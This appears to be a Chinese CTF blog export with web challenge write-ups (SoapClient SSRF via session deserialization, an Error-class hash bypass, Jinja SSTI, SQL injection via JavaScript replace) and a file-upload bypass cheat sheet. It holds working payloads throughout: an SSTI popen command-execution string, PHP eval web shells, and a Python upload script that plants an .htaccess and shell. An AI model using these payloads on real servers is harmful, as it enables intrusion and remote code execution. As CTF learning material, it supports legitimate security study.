style="font-size:15px">通过flag.php文件得到信息，我们需要用127.0.0.1访问它才能得到flag，那么很明显就是要我们利用SSRF，回到题目的源码，我们的思路就是寻找能SSRF的点，这里就是利用SoapCLient内置类的__call方法进行，那么要利用它就是要进行反序列化，但是这里没有POP链，看到session_start我们可以尝试SESSION反序列化漏洞，我们先把靶机的serialize_handler改为phpserialize</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">PHP <span class="hljs-number">7</span> 中 session_start () 函数可以接收一个数组作为参数，可以覆盖 php.ini 中 <span class="hljs-keyword">session</span> 的配置项。这个特性也引入了一个新的 php.ini 设置（<span class="hljs-keyword">session</span>.lazy_write）<br></code></pre></td></tr></table></figure><p>我们传入f&#x3D;session_start,post:array(‘serialize_handler’&#x3D;&gt;’php_serialize’),即可达到session_start(array(‘serialize_handler’ &#x3D;&gt; ‘php_serialize’)) 将他的serialize_handler改为php_serialize</p><p>然后我们构造一个序列化字符串</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs mel">&lt;?php<br>$target=<span class="hljs-string">&#x27;http://127.0.0.1/flag.php&#x27;</span>;<br>$b = new SoapClient(null,array(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; $target,<br>    <span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; <span class="hljs-string">&quot;npfs\r\nCookie:PHPSESSID=123456\r\n&quot;</span>,<br>    <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&quot;http://127.0.0.1/&quot;</span>));<br><br>$se = serialize($b);<br>echo <span class="hljs-string">&quot;|&quot;</span>.urlencode($se);<br><br><span class="hljs-comment">//注意下，这个脚本想要执行，需要将php.ini里的 php_soap.dll 前面的分号去掉</span><br>这里的sessid需要记住，后面要指定sessid访问页面来让他进行反序列化<br><br>|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127<span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127<span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A31%3A%22npfs%0D%0ACookie%3APHPSESSID%3D123456%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D<br><br><br></code></pre></td></tr></table></figure><p>接下来就是让这一字符串写入到他的session文件当中,这样他的session文件中就是一个SOAP对象<br><img src="/../img/bestphp/1.jpg" alt="WEB!"><br>让他的session[‘name’]&#x3D;$_GET[‘name’]</p><p>第二步：通过变量覆盖，调用SoapClient类，从而触发__call 方法传值f&#x3D;extract&amp;name&#x3D;SoapClient POST:b&#x3D;call_user_func. 这样 call_user_func($b,$a)就变成call_user_func(‘call_user_func’,array(‘SoapClient’,’welcome_to_the_lctf2018’)) ，即调用 SoapClient 类不存在的 welcome_to_the_lctf2018 方法，从而触发 __call 方法发起 soap 请求进行 SSRF。</p><p>这里的,我们访问时他会解析上一步的session文件，这样的的session数组的第一个元素就是一个SOAP对象，这里我们对它进行访问XXXX2018方法，触发__call导致SSRF<br>在flag.php。会将flag赋值给$_SESSION[‘flag’]</p><p>第三步：将PHPSESSID改为我们在SoapClient类里设置的123456即可得到flag</p><h2 id="极客大挑战-2020-Greatphp-WP"><a href="#极客大挑战-2020-Greatphp-WP" class="headerlink" title="[极客大挑战 2020]Greatphp:WP"></a>[极客大挑战 2020]Greatphp:WP</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ol><li>Error|Exception内置类</li><li>反序列化基础</li><li>取反绕过</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;syc != <span class="hljs-variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;syc) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;syc)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;lover)) )&#123;<br>           <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>))&#123;<br>               <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;syc);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);<br>           &#125;<br>           <br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p sytle="font-size:13px">第一眼看到题目，简单的md5和sha1绕过，一般传个数组进去就绕过了，但是这里发现他还需要对值进行命令执行,这里如果把数组传入eval当中会报错，这里我们就使用Error和Exeption内置类来绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-number">1</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-number">2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\r\n\r\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br></code></pre></td></tr></table></figure><p><img src="/../img/bestphp/2.png" alt="web2"><br>当ehco一个Exception类时会触发他的__toString方法，我们可以看到他除了报错行数之外都是相同的，那么久意味着我们若把两者放在同一行他们__toString方法的结果就是相同的，md5和sha1的结果也是相同的，并且他内部有一个code值，让他在比较时是不同的这里我们就可以绕过</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">if</span>( ($<span class="hljs-keyword">this</span>-&gt;syc != $<span class="hljs-keyword">this</span>-&gt;lover) &amp;&amp; (md5($<span class="hljs-keyword">this</span>-&gt;syc) === md5($<span class="hljs-keyword">this</span>-&gt;lover)) &amp;&amp; (sha1($<span class="hljs-keyword">this</span>-&gt;syc)=== sha1($<span class="hljs-keyword">this</span>-&gt;lover)) )<br></code></pre></td></tr></table></figure><p>然后是命令执行，测试发现当一个Exception类传到eval当中的时候他获取的值是他的message,并且message我们可控，那么题目就可以命令执行</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$b</span>,<span class="hljs-variable">$c</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;syc = <span class="hljs-variable">$b</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;lover = <span class="hljs-variable">$c</span>;<br>    &#125;<br><span class="hljs-variable">$in</span> = ~(<span class="hljs-string">&quot;/flag&quot;</span>);<br><span class="hljs-variable">$payload</span> = <span class="hljs-string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="hljs-variable">$in</span>.<span class="hljs-string">&quot;?&gt;&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-number">2</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">SYCLOVER</span>(<span class="hljs-variable">$b</span>,<span class="hljs-variable">$c</span>);<br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>)));<br><span class="hljs-meta">?&gt;</span><br>因为过滤了引号所以需要取反绕过一下<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>第八届西湖论剑WP</title>
    <link href="/2025/01/19/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91WP/"/>
    <url>/2025/01/19/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91WP/</url>
    
    <content type="html"><![CDATA[<h2 id="WEB1"><a href="#WEB1" class="headerlink" title="WEB1"></a>WEB1</h2><p style="font-size:10px;color:#7f8c93">题目来源：西湖论剑2025<br>题目类型：WEB<br>设计考点：SSTI</p><p>WEB1<img src="/./../img/XHLJ/WEB1.png"></p><p>Payload: </p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">&#123;%for i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()%&#125;&#123;%if i.__name__ ==<span class="hljs-string">&#x27;_wrap_close&#x27;</span>%&#125;&#123;%print i.__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](request.cookies.x).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;<br></code></pre></td></tr></table></figure><p>首先分析页面，给了一个登录页面<br><img src="/./../img/XHLJ/WEB1-2.png" alt="WEB1-2" title="web1-2"></p><p>发现登录之后会提示某某账号不存在或者密码错误，看到他的response包<br><img src="/./../img/XHLJ/WEB1-3.png" alt="WEB1-3" title="web1-3"></p><p>发现他是用python写的后端，猜测可能是SSTI漏洞<br>直接打payload，测试发现&#x2F;斜杠被过滤，用request.cookie.x绕过即可</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">&#123;%for i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()%&#125;&#123;%if i.__name__ ==<span class="hljs-string">&#x27;_wrap_close&#x27;</span>%&#125;&#123;%print i.__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](request.cookies.x).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;<br></code></pre></td></tr></table></figure><p><img src="/./../img/XHLJ/web1-6.png" alt="web" title="result"></p><h2 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h2><p style="font-size:10px;color:#7f8c93">题目来源：西湖论剑2025<br>题目类型：WEB<br>设计考点：JS框架,replace函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><br><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.<span class="hljs-title class_">Router</span>();<br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-function">(<span class="hljs-params">req,res,next</span>)=&gt;</span>&#123;<br>    <span class="hljs-keyword">if</span>(req.<span class="hljs-property">query</span>.<span class="hljs-property">info</span>)&#123;<br>        <span class="hljs-keyword">if</span>(req.<span class="hljs-property">url</span>.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/\,/ig</span>))&#123;<br>            res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;hacker1!&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">var</span> info = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(req.<span class="hljs-property">query</span>.<span class="hljs-property">info</span>);<br>        <span class="hljs-keyword">if</span>(info.<span class="hljs-property">username</span>&amp;&amp;info.<span class="hljs-property">password</span>)&#123;<br>            <span class="hljs-keyword">var</span> username = info.<span class="hljs-property">username</span>;<br>            <span class="hljs-keyword">var</span> password = info.<span class="hljs-property">password</span>;<br>            <span class="hljs-keyword">if</span>(info.<span class="hljs-property">username</span>.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/\&#x27;|\&quot;|\\/</span>) || info.<span class="hljs-property">password</span>.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/\&#x27;|\&quot;|\\/</span>))&#123;<br>                res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;hacker2!&#x27;</span>);<br>            &#125;<br>            <span class="hljs-keyword">var</span> sql = <span class="hljs-string">&quot;select * from userinfo where username = &#x27;&#123;username&#125;&#x27; and password = &#x27;&#123;password&#125;&#x27;&quot;</span>;<br>            sql = sql.<span class="hljs-title function_">replace</span>(<span class="hljs-string">&quot;&#123;username&#125;&quot;</span>,username);<br>            sql = sql.<span class="hljs-title function_">replace</span>(<span class="hljs-string">&quot;&#123;password&#125;&quot;</span>,password);<br>            connection.<span class="hljs-title function_">query</span>(sql,<span class="hljs-keyword">function</span> (<span class="hljs-params">err,rs</span>) &#123;<br>            <span class="hljs-keyword">if</span> (err) &#123;<br>                res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;error1&#x27;</span>);<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">if</span>(rs.<span class="hljs-property">length</span>&gt;<span class="hljs-number">0</span>)&#123;<br>                res.<span class="hljs-title function_">sendFile</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br>                &#125;<span class="hljs-keyword">else</span> &#123;<br>                res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;username or password error&#x27;</span>);<br>                &#125;<br>            &#125;<br>            &#125;)<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;please input the data&quot;</span>);<br>        &#125;<br>       <br>&#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;please input the data&quot;</span>);<br>    &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>题目需要传入一个info值，格式是json，但是$req.url$后面过滤了逗号，这里用URL编码绕过，<br>继续审计后面，一个SQL语句，把我们传入的username还有password过滤后拼接到语句当中，但是把闭合符都给过滤了，这里引入JavaScript中replace的一个知识点</p><p><img src="/./../img/XHLJ/web2-1.png" alt="web2" title="知识点"></p><p>我们这里就是用$&#96;来过滤</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">$` 例子:<br>var <span class="hljs-keyword">a</span>=<span class="hljs-string">&quot;i am not a dog dog&quot;</span><br><span class="hljs-keyword">a</span>=<span class="hljs-keyword">a</span>.<span class="hljs-built_in">replace</span>(<span class="hljs-string">&quot;dog&quot;</span>,<span class="hljs-string">&quot;$`cat&quot;</span>)<br>他后面的pattern值应该是找到第一个和dog匹配的位置，然后把$`替换成这个位置之前的字符串<br>所以pattern=i am <span class="hljs-keyword">not</span> <span class="hljs-keyword">a</span> cat<br>然后把<span class="hljs-keyword">a</span>当中的dog替换成pattern<br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">所以我们这里的$`可以识别成<span class="hljs-keyword">select</span> * from userinfo where username <span class="hljs-operator">=</span> &#x27;<span class="hljs-punctuation">,</span>这里有一个单引号可以用来闭合<br>构造payload<br>&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;$` or 1=1 --+&quot;</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>参考WP：<a href="https://mp.weixin.qq.com/s/jV-mrqFJOqSBlBDXRaEjqw">https://mp.weixin.qq.com/s/jV-mrqFJOqSBlBDXRaEjqw</a></p>]]></content>
    
    
    <categories>
      
      <category>赛事回顾</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>文件上传</title>
    <link href="/2024/08/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2024/08/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="正常的一句话木马"><a href="#正常的一句话木马" class="headerlink" title="正常的一句话木马"></a>正常的一句话木马</h2><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">   //开始上传图片中写入的一句话木马</span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_REQUEST[<span class="hljs-string">&#x27;cmd&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>     //    用于绕过 </span><span class="language-php"><span class="hljs-meta">&lt;?</span></span><br><span class="language-php"></span><br><span class="language-php">还可以在前面加 幻术头绕过   GIF89a（GIF图片的ascii 值）</span><br></code></pre></td></tr></table></figure><hr><h3 id="若使用exif-imagetype-函数-对上传文件后缀进行了限制。"><a href="#若使用exif-imagetype-函数-对上传文件后缀进行了限制。" class="headerlink" title="若使用exif_imagetype() 函数 对上传文件后缀进行了限制。"></a>若使用exif_imagetype() 函数 对上传文件后缀进行了限制。</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml">GIF89a<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_REQUEST[<span class="hljs-string">&#x27;cmd&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>//三种图片的前缀<br>JPG ：FF D8 FF E0 00 10 4A 46 49 46（16进制编码）<br>GIF：47 49 46 38 39 61（ascll值是GIF89a）<br>PNG： 89 50 4E 47<br></code></pre></td></tr></table></figure><hr><h3 id="user-ini-文件"><a href="#user-ini-文件" class="headerlink" title=".user.ini 文件"></a>.user.ini 文件</h3><p style='font-size:12x;text-indent:2em'>到现在我们就可以上传成功一个图片了，但它一句话木马并不能被作为PHP文件解析，那么怎么样去绕过？？？在学习文件上传时应该都学过， .htaccess 文件，可以把后缀为其他类型的图片解析成php文件对，使我们上传的图片内容可以被解析，但是这里对 .htaccess文件也做了限制，所以我们就需要想其他的办法。</p><h4 id="一般的-htaccess文件"><a href="#一般的-htaccess文件" class="headerlink" title="一般的.htaccess文件"></a>一般的.htaccess文件</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch&gt;</span><br><span class="hljs-attribute">SetHandler</span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br><br><span class="hljs-attribute">AddType</span> application/x-httpd-php .zm<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">import base64<br>import requests<br>htaccess=<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">#define width 666</span><br><span class="hljs-string">#define height 666</span><br><span class="hljs-string">AddType application/x-httpd-php .ahhh</span><br><span class="hljs-string">php_value auto_append_file &quot;</span>php:<span class="hljs-comment">//filter/convert.base64-decode/resource=./shell.ahhh&quot;</span><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">shell=b&quot;</span>GIF89a12<span class="hljs-string">&quot;+base64.b64encode(b&quot;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><span class="hljs-string">&quot;)</span><br><span class="hljs-string">url=&quot;</span>http:<span class="hljs-comment">//c7352155-c63d-4323-9d91-b38477e4f41f.node5.buuoj.cn:81/?_=$&#123;%f8%f8%f8%f8^%a7%bf%bd%ac&#125;&#123;%f8&#125;();&amp;%f8=get_the_flag&quot;</span><br>files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&#x27;.htaccess&#x27;</span>,htaccess,<span class="hljs-string">&#x27;image/jpeg&#x27;</span>)&#125;<br>data=&#123;<span class="hljs-string">&quot;upload&quot;</span>:<span class="hljs-string">&quot;Submit&quot;</span>&#125;<br>response=requests.<span class="hljs-title function_ invoke__">post</span>(url=url,data=data,files=files)<br><span class="hljs-keyword">print</span>(response.text)<br>files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&#x27;shell.ahhh&#x27;</span>,shell,<span class="hljs-string">&#x27;image/jpeg&#x27;</span>)&#125;<br>response=requests.<span class="hljs-title function_ invoke__">post</span>(url=url,data=data,files=files)<br><span class="hljs-keyword">print</span>(response.text)<br></code></pre></td></tr></table></figure><h5 id="这里我们引入一个php目录配置文件-user-ini"><a href="#这里我们引入一个php目录配置文件-user-ini" class="headerlink" title="这里我们引入一个php目录配置文件 .user.ini"></a>这里我们引入一个php目录配置文件 .user.ini</h5><p>作用：这里如果我们上传一个.user.ini 文件，那么当我们访问目录中的任何php文件时，都会调用.user.ini中指定的文件以php的形式进行读取我<br>们在user.ini设置文件</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">//上传.user.ini文件，条件如下：</span><br><br>(<span class="hljs-number">1</span>)服务器脚本语言为PHP                     <br>(<span class="hljs-number">2</span>)对应目录下面有可执行的php文件              <span class="hljs-comment">//index.php</span><br>(<span class="hljs-number">3</span>)服务器使用CGI／FastCGI模式   <br><br><br>上传的文件内容<br>GIF89a                         <span class="hljs-comment">//auto_prepend_file是在文件前插入，而auto_append_file是在文件最后才插入。                  </span><br>auto_prepend_file=<span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.gif</span>       <span class="hljs-comment">//需要注意上穿的文件名字要和设定的名字一样，这里可以设定多个</span><br></code></pre></td></tr></table></figure><p>上传了 $.user.ini$ 文件之后，执行 $.user.ini$ 文件目录下的任意PHP文件，那么他就会执行我们在 $.user.ini$ 文件中制定的那个任意文件，且作为PHP文件执行</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">举个例子理解user.ini作用：<br><span class="hljs-comment">/*这是.user.ini的两个配置  </span><br><span class="hljs-comment">auto_prepend_file是在文件前插入</span><br><span class="hljs-comment">auto_append_file是在文件最后才插入*/</span><br><br><span class="hljs-number">1</span>.在user<span class="hljs-selector-class">.ini</span> 中设置<br>auto_prepend_file=<span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.gif</span><br><br><span class="hljs-number">2</span>.在<span class="hljs-selector-tag">b</span>.gif中设置 一句话木马<br><br><span class="hljs-number">3</span>.还有个php文件 如：前面做题中的index<span class="hljs-selector-class">.php</span>    <br><br>如果这三个条件在同一个目录下面，就会出先问题，这里就相当于 在index.php中写<br>了include <span class="hljs-string">&quot;b.gif&quot;</span> , 可以进行文件包含，导致的后果是：当我们对目录中的index.<br>php进行访问的时候，会调用<span class="hljs-selector-class">.usre</span><span class="hljs-selector-class">.ini</span> 中的文件把<span 